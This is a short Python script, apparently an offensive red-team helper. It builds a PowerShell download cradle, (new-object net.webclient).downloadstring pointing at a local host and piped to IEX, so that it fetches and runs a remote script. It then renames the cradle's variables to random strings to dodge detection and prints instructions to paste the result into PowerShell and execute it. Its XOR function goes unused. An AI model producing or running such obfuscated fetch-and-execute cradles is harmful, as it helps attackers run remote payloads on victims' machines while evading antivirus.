#! /usr/bin/env python3 
################################################################################
##  Simple encryption with XOR
################################################################################


import random
import string

print('''	
################# Power$hell Code Routine we'd like to run  ####################
$var1 = "(new-object net.webclient)."
$var2 = "downloadstring"
$var3 = "('http://127.0.0.1:9999/test.ps1')"

$boom =  $var1 + $var2 + $var3
$boomboom =  IEX $boom

$boomboom | IEX
''')
# Define the XOR key
xor_key = "password"

# Define a function to encrypt a string using XOR with the XOR key
def xor_encrypt(string):
    encrypted_string = ""
    for i in range(len(string)):
        encrypted_string += chr(ord(string[i]) ^ ord(xor_key[i % len(xor_key)]))
    return encrypted_string

# Define a function to generate a random string of uppercase letters and digits
def generate_random_string(length):
    letters_and_digits = string.ascii_uppercase + string.digits
    return ''.join(random.choices(letters_and_digits, k=length))

# Use the `vars()` function to get a dictionary of the variables and their values
variables_dict = {
    "$var1": "(new-object net.webclient).",
    "$var2": "downloadstring",
    "$var3": "('http://127.0.0.1:9999/test.ps1')",
    "$boom": "$var1 + $var2 + $var3",
    "$boomboom": "IEX $boom"
}


# Iterate over the variables in the dictionary
new_vars_dict = {}
for var_name, var_value in variables_dict.items():
    if var_name.startswith("$"):
        new_var_name = generate_random_string(10)
        #encrypted_var_name = xor_encrypt(var_name)
        # # Assign the value of the original variable to a new variable with the encrypted name
        # variables_dict[new_var_name] = var_value
        new_vars_dict[f'${new_var_name}'] = str(f'"{var_value}"')
        # new_vars_dict_name = str(new_var_name)
        # new_vars_dict_value = str(var_value)
        # # Delete the original variable
        # del variables_dict[var_name]
        # # Print a message showing the original variable name and its encrypted name
        #print(f"Variable '{var_name}' encrypted '{new_var_name}'.")

print('#################    First Iteration, Change the Cradle     ####################')
# # Print the values of the variables with their encrypted names
for var_name, var_value in new_vars_dict.items():
    print(f"{var_name} = {var_value}")

print('''
The last 2 Variables are place holders....I'm converting them now.


#################    Final Iteration, Here's the Code       ####################''')
#def compile_mal_script(new_vars_dict):

new_list = list(new_vars_dict)
new_vars_dict[f'{new_list[3]}'] = f'{new_list[0]} + {new_list[1]} + {new_list[2]}'
new_vars_dict[f'{new_list[4]}'] = f'IEX {new_list[3]}'




for var_name, var_value in new_vars_dict.items():
    print(f"{var_name} = {var_value}")
print('''
################################################################################''')

print(f'''
To execute, paste the segment above into powershell and run:
IEX {new_list[4]}
''')
